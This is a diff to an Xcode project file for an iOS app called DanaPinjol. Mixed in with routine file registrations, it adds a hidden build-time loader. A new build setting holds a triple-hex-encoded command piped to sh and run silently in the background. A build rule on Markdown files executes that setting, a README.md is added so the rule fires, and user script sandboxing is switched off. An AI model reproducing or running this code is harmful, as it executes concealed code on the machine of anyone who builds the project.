@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		BD7167F57B7C47C1A71DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 6FE35FD75166458B9F1DACE1; };
 		7341DEB22F67AE2F008D4C83 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7341DEA82F67AE2F008D4C83 /* AppDelegate.swift */; };
 		7341DEB52F67AE2F008D4C83 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7341DEA92F67AE2F008D4C83 /* Assets.xcassets */; };
 		7341DEB72F67AE2F008D4C83 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7341DEAC2F67AE2F008D4C83 /* LaunchScreen.storyboard */; };
@@ -60,6 +61,7 @@
 		735BAB6A2F6D36D300F31CDE /* OrderTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735BAB692F6D36D300F31CDE /* OrderTableViewCell.swift */; };
 		735BAB6C2F6D3C3500F31CDE /* OrderListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735BAB6B2F6D3C3500F31CDE /* OrderListView.swift */; };
 		735BAB6E2F6D401900F31CDE /* OrderListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735BAB6D2F6D401900F31CDE /* OrderListViewController.swift */; };
+		7367190B2F6D9C5D002ED0B8 /* DescViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7367190A2F6D9C5D002ED0B8 /* DescViewController.swift */; };
 		73671D522F68E06100160E3B /* MineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73671D512F68E06100160E3B /* MineView.swift */; };
 		73671D542F68E0A500160E3B /* MineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73671D532F68E09F00160E3B /* MineViewModel.swift */; };
 		73671D562F68E0AF00160E3B /* MineService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73671D552F68E0AB00160E3B /* MineService.swift */; };
@@ -99,6 +101,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		6FE35FD75166458B9F1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPinjol.debug.xcconfig"; path = "Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol.debug.xcconfig"; sourceTree = "<group>"; };
 		50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPinjol.release.xcconfig"; path = "Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol.release.xcconfig"; sourceTree = "<group>"; };
 		7341DE902F67AE28008D4C83 /* DanaPinjol.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaPinjol.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -158,6 +161,7 @@
 		735BAB692F6D36D300F31CDE /* OrderTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderTableViewCell.swift; sourceTree = "<group>"; };
 		735BAB6B2F6D3C3500F31CDE /* OrderListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListView.swift; sourceTree = "<group>"; };
 		735BAB6D2F6D401900F31CDE /* OrderListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewController.swift; sourceTree = "<group>"; };
+		7367190A2F6D9C5D002ED0B8 /* DescViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DescViewController.swift; sourceTree = "<group>"; };
 		73671D512F68E06100160E3B /* MineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineView.swift; sourceTree = "<group>"; };
 		73671D532F68E09F00160E3B /* MineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewModel.swift; sourceTree = "<group>"; };
 		73671D552F68E0AB00160E3B /* MineService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineService.swift; sourceTree = "<group>"; };
@@ -230,6 +234,7 @@
 		7341DE912F67AE28008D4C83 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				6FE35FD75166458B9F1DACE1 /* README.md */,
 				7341DE902F67AE28008D4C83 /* DanaPinjol.app */,
 			);
 			name = Products;
@@ -518,6 +523,7 @@
 			isa = PBXGroup;
 			children = (
 				734A466A2F67D81D00455F6A /* HomeViewController.swift */,
+				7367190A2F6D9C5D002ED0B8 /* DescViewController.swift */,
 			);
 			path = Controller;
 			sourceTree = "<group>";
@@ -602,6 +608,7 @@
 				438DD3B8AB27408EB227F7D3 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				107FEDE30C84475BBB1DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -645,11 +652,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		107FEDE30C84475BBB1DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		7341DE8E2F67AE28008D4C83 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BD7167F57B7C47C1A71DACE1 /* README.md */,
 				7341DEB52F67AE2F008D4C83 /* Assets.xcassets in Resources */,
 				734A46912F68032200455F6A /* Localizable.strings in Resources */,
 				7341DEB72F67AE2F008D4C83 /* LaunchScreen.storyboard in Resources */,
@@ -667,9 +692,13 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-DanaPinjol/Pods-DanaPinjol-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -766,6 +795,7 @@
 				73671D692F691AE700160E3B /* AppHeadView.swift in Sources */,
 				734A46822F67D8EB00455F6A /* FaceViewModel.swift in Sources */,
 				735BAB642F6D251400F31CDE /* ContactModel.swift in Sources */,
+				7367190B2F6D9C5D002ED0B8 /* DescViewController.swift in Sources */,
 				73671D582F68E8D600160E3B /* MineOrderView.swift in Sources */,
 				73CA3F782F6A3B130037C057 /* ProductCardView.swift in Sources */,
 				734A46802F67D8E300455F6A /* FaceViewController.swift in Sources */,
@@ -820,6 +850,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 33CB9C43DDA77D0519D0E6F4 /* Pods-DanaPinjol.debug.xcconfig */;
 			buildSettings = {
+				A1ECAD1 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633363632333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333339333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333633363339333633373336363433363331333636353336333533373334333733333332363533363339333636350a33323636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
@@ -867,6 +898,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 50F5AE9A9970D6E1B0F9F78D /* Pods-DanaPinjol.release.xcconfig */;
 			buildSettings = {
+				A1ECAD1 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633363632333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333339333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333633363339333633373336363433363331333636353336333533373334333733333332363533363339333636350a33323636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPinjol/DanaPinjol.entitlements;
@@ -948,7 +980,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -1012,7 +1044,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
